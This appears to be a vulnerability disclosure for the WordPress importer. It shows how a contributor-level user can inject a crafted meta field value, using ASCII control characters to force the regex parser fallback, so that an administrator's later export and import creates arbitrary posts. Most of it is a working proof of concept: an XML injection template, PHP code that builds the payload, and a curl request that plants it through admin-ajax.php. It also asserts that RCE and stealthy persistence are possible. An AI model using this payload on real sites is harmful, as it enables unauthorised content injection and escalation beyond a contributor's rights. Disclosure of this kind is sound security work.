# wordpress-importer arbitrary post create

Native WordPress importer have 3 different parser classes: `WXR_Parser_SimpleXML`, `WXR_Parser_XML` and `WXR_Parser_Regex`. If first two required PHP extensions (`simplexml` and `xml`) aren't installed or somehow they fail during export file parsing, then everything should be done by `WXR_Parser_Regex` class. 

Failing could occure because:
- malformed XML file 
- Huge XML file with lot of data (libxml doesn't obay memory constraints from php.ini)
- most important one: those extensions can't parse XML data that holds ascii control characters in it.

In the `WXR_Parser_Regex` we have following 
```
foreach ( $multiline_tags as $tag => $handler ) {
	// Handle multi-line tags on a singular line
	if ( preg_match( '|<' . $tag . '>(.*?)</' . $tag . '>|is', $importline, $matches ) ) {
...
``` 
and this means that somewhere in the user input if there is `</item>` we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towards `WXR_Parser_Regex` checked and entry point checked, time for demo.

## Eli5 PoC

On any WP instance log in with `contributor` user role. Create blog post and add meta / custom field with following value :)
Template payload for meta value:
```
</wp:meta_value></wp:postmeta></item>
[asciicontrol]
<item>
<title>Attack-Post-1337</title>
<link>http://attack.post/2020/07/19/attack-post/</link>
<pubDate>Sun, 19 Jul 2020 20:57:17 +0000</pubDate>
<dc:creator>attacker</dc:creator>
<guid isPermaLink="false">http://attack.post?p=1337</guid>
<description></description>
<content:encoded><!-- wp:paragraph -->
<p>boom jee</p>
<!-- /wp:paragraph --></content:encoded>
<excerpt:encoded></excerpt:encoded>
<wp:post_id>1337</wp:post_id>
<wp:post_date>2020-07-19 20:57:17</wp:post_date>
<wp:post_date_gmt>2020-07-19 20:57:17</wp:post_date_gmt>
<wp:comment_status>open</wp:comment_status>
<wp:ping_status>open</wp:ping_status>
<wp:post_name>attack-post</wp:post_name>
<wp:status>publish</wp:status>
<wp:post_parent>0</wp:post_parent>
<wp:menu_order>0</wp:menu_order>
<wp:post_type>post</wp:post_type>
<wp:post_password></wp:post_password>
<wp:is_sticky>0</wp:is_sticky>
<category domain="category" nicename="uncategorized">Uncategorized</category>
<wp:postmeta>
<wp:meta_key>_test</wp:meta_key>
<wp:meta_value>
``` 
prepare this template payload on the following way
```
//grab the content
$cnt = file_get_contents("attack-template.txt");
//add ascii control characters
$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
//url encode it and it is ready to be used towards any meta (custom) field as value
file_put_contents("final-payload.txt", urlencode($cnt));
```
and create the meta / custom field as `contributor`.
```
curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&action=add-meta&metakeyselect=%23NONE%23&metakeyinput=wpdeeply&metavalue=[content_from_final-payload.txt]&_ajax_nonce-add-meta=61b457d48c&post_id=[your_post_id]' --compressed
```
Now log in as `administrator` export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by contributor.

## Few facts

- Many mainstream plugins accept raw user input in meta / custom fields
- RCE could be achieved without user/attacker interaction when import occurs
- persistence and stealth agents planting is 100% option in WP

## Remediation

- Sign the posts / data exported and check the signature with data need to be imported
- Follow 101 security practices for web applications

